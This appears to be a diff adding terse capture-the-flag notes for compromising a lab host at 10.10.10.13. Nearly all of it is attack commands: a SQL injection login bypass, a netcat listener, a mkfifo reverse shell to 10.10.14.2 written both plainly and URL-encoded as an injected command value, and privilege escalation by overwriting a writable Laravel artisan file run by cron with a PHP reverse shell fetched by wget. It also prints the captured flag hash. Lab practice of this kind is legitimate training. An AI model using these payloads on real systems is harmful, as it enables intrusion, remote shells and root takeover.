@@ -1,0 +1,33 @@
+dnsrecon -n 10.10.10.13 -r 10.10.10.0/24
+
+
+add found results in /etc/hosts
+
+username:admin'-- -
+password:asndj
+
+listen to nc -lnvp 1337
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1337 >/tmp/f
+
+command=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.2+1337+>/tmp/f
+
+bash -i
+
+cd /etc/
+cat crontab | less
+php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+(We know there is a job is running in background)
+
+the file of the location /var/www/lavarel/artisan is writeable
+
+so we spawn a http server
+
+wget http://10.10.14.2:8000/artisan (upload php monkey reverse tcp kit)
+
+few mins later the job is running in the background woala we are root
+
+1703b8a3c9a8dde879942c79d02fd3a0
+
+
